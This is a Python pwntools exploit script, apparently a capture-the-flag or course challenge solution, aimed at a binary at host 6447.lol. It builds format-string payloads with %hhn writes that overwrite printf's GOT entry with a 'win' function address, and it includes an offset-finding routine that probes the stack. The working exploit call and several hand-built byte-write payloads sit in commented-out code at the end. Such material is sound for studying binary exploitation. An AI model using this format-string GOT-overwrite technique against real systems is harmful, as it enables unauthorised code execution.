#!/usr/bin/env python3

# Arch:       amd64-64-little
# RELRO:      No RELRO                      -- GOT is writable
# Stack:      No canary found               -- no buffer overflow protection
# NX:         NX enabled                    -- non-executable stack
# PIE:        No PIE (0x400000)             -- fixed addresses for simplified exploitation
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *

HOST = "6447.lol"
PORT = args.PORT if args.PORT else 4001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    if max_size % 8 != 0:
        raise Exception('Max size must be a multiple of 8.')

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload

def connect_binary():
    global P, E, TARGET, WIN
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")
    
        TARGET = E.got['printf']
        WIN = E.symbols['win']              # 0x 00 40 11 d6

def say(payload):
    P.recvuntil(b"You say:")
    P.sendline(payload)

def exploit():
    pass

def find_offset(after = b':', option = 1):
    for i in range(1, 200):
        connect_binary()

        if option == 1:
            P.sendlineafter(after, f'AAAA%{i}$x'.encode())
            output = P.recvline(timeout=0.5).strip().decode('utf-8')
        else:
            P.sendlineafter(after, f'AAAABBBB %{i}$p') # replace %x with %s to find the actual values
            P.recvuntil('AAAABBBB')
            print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        context.log_level = 'error'
        P.close()
        context.log_level = 'info'

        if option == 1 and '41414141' in output:
            return i

if __name__ == '__main__':
    find_offset(option=2)
    exploit()


# def exploit():
#     offset = 5 # find_offset(b"You say:")
#     log.info(f"Using offset: {offset}")

#     connect_binary()
    
#     log.info(f"TARGET function address: {hex(TARGET)}")
#     log.info(f"WIN function address: {hex(WIN)}")

#     payload = build_format_string(TARGET, WIN, 133)
#     say(payload)
    
#     log.info(f"Payload sent: {payload}")
#     P.interactive()

# payload = p64(TARGET)
# payload += f'%{0x004011d6 - len(payload)}x%{offset}$p'.encode()

# payload = p64(TARGET)
# payload += p64(TARGET + 1)
# payload += p64(TARGET + 2)
# payload += p64(TARGET + 3)

# write_d6 = 0xd6 - len(payload)
# payload += f'%{write_d6}x%{offset}$hhn'.encode()

# write_11 = 0x100 + 0x11 - 0xd6
# payload += f'%{write_11}x%{offset + 1}$hhn'.encode()

# write_40 = 0x100 + 0x40 - 0x11
# payload += f'%{write_40}x%{offset + 2}$hhn'.encode()

# write_00 = 0x100 + 0x00 - 0x40
# payload += f'%{write_00}x%{offset + 3}$hhn'.encode()